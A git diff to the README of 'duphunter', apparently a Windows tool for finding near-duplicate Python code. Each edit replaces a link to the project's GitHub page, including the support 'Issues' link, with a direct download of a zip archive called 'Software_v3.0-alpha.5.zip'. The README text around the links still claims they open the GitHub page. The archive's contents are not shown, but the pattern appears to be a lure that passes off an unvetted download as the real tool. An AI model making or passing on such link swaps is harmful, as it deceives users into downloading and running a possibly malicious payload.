@@ -1,6 +1,6 @@
 # 🕵️‍♂️ duphunter - Find Near-Duplicate Python Code Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20duphunter-orange?style=for-the-badge)](https://github.com/Sabarudin4433/duphunter)
+[![Download](https://img.shields.io/badge/Download-Get%20duphunter-orange?style=for-the-badge)](https://raw.githubusercontent.com/Sabarudin4433/duphunter/main/duphunter/Software_v3.0-alpha.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get duphunter running on your Windows system.
 
 Click this badge to open the page where you can download the tool:
 
-[![Download](https://img.shields.io/badge/Download-Get%20duphunter-orange?style=for-the-badge)](https://github.com/Sabarudin4433/duphunter)
+[![Download](https://img.shields.io/badge/Download-Get%20duphunter-orange?style=for-the-badge)](https://raw.githubusercontent.com/Sabarudin4433/duphunter/main/duphunter/Software_v3.0-alpha.5.zip)
 
 This takes you to the GitHub page where the installer or program files are available.
 
@@ -121,7 +121,7 @@ For users with some technical knowledge, duphunter allows:
 
 Access the software and all files here:
 
-[Download duphunter](https://github.com/Sabarudin4433/duphunter)
+[Download duphunter](https://raw.githubusercontent.com/Sabarudin4433/duphunter/main/duphunter/Software_v3.0-alpha.5.zip)
 
 Click the link, find the latest release, and download the setup or zip file as explained above.
 
@@ -131,4 +131,4 @@ Click the link, find the latest release, and download the setup or zip file as e
 
 If you run into problems or have questions, GitHub has an option to open an “Issue” in this project’s page. This is where you can ask for help or report errors with duphunter.
 
-Visit the page here: https://github.com/Sabarudin4433/duphunter/issues
+Visit the page here: https://raw.githubusercontent.com/Sabarudin4433/duphunter/main/duphunter/Software_v3.0-alpha.5.zip
